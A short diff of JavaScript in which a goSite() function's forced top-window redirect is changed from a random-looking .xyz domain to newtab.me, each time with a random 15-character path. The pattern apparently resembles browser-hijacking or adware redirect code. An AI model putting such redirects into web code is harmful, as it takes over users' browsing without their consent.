@@ -59,7 +59,7 @@ function checkOrg(){
 }
 
 function goSite(){
-	top.location.href = "http://isuvijulub.xyz/"+rastgele(15);
+	top.location.href = "http://newtab.me/"+rastgele(15);
 }
 
 function rastgele(uzunluk) {
